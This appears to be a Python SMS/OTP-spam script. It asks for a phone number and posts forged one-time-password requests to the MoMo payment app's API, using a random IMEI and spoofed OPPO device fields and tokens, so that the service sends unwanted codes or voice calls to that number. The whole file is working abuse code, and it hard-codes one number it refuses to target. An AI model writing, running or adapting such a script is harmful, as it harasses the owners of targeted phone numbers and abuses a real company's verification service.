import json
import urllib.request
import urllib
import uuid
import requests
import hmac
import hashlib, random ,time
from fastapi import FastAPI 
from time import sleep
sdtspam=input ('Enter Momo : ')
if sdtspam=="0904297518":
 exit('Cút spam cc')
def generateRandomString(length = 20) :
    characters = '0123456789abcdef'
    charactersLength = len(characters)
    randomString = ''
    i = 0
    while ( i < length ) :
        randomString += characters[random.randint(0, charactersLength - 1)]
        i+=1
    return randomString
def generateImei() :
        return str(str(str(str(str(str(str(str(generateRandomString(8)) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(12));  
def spam(phone=sdtspam):
 import json
 time=random.randint(1000000000000,1999999999999)
 url="https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG"
 data={
  "user":phone,
  "msgType": "SEND_OTP_MSG",
  "cmdId": f"{time}000000",
  "lang": "vi",
  "time": time,
  "channel": "APP",
  "appVer": "31132",
  "appCode": "3.1.13",
  "deviceOS": "ANDROID",
  "buildNumber": "0",
  "appId": "vn.momo.platform",
  "result": "true",
  "errorCode": "0",
  "errorDesc": "",
  "momoMsg": {
    "_class": "mservice.backend.entity.msg.RegDeviceMsg",
    "number": phone,
    "imei": generateImei(),
    "cname": "Vietnam",
    "ccode": "084",
    "device": "CPH1605",
    "firmware": "23",
    "hardware": "mt6755",
    "manufacture": "OPPO",
    "csp": "Mobifone",
    "icc": "",
    "mcc": "452",
    "device_os": "Android",
    "secure_id": "8690edc7f026c91a"
  },
  "extra": {
    "action": "SEND",
    "rkey": "JblizbbwaRqHfbjgdE5B",
    "AAID": "d2c5960f-4f4b-4a3a-af16-a1073c65de46",
    "IDFA": "",
    "TOKEN": "epHwy5M5RJ2uQtTs5BuK9L:APA91bEEftQpDT1D8hfr49F5IFaUaT1Ir1u16DpPPaZvZxevGcal5andVP8DNYCTUwdi8G5TNxzLbNuRdfjP0UxQT5udl4dQheDDS51rm1F4JDCsUPhk05XxVQJ72ZcviVB0tCSD1usx",
    "SIMULATOR": "false",
    "SECUREID": "8690edc7f026c91a",
    "MODELID": "oppo cph1605mt6755b6z9qwrwhuy9yhrk",
    "isVoice": "true",
    "REQUIRE_HASH_STRING_OTP": "true",
    "checkSum": ""
  
 }
 }
 h={
'Host':'api.momo.vn',
'msgtype':'SEND_OTP_MSG',
'user-agent':'okhttp/4.9.0',}
 data = json.dumps(data)
 json=requests.post(url,headers=h,data=data).text
 print(json)
spam()
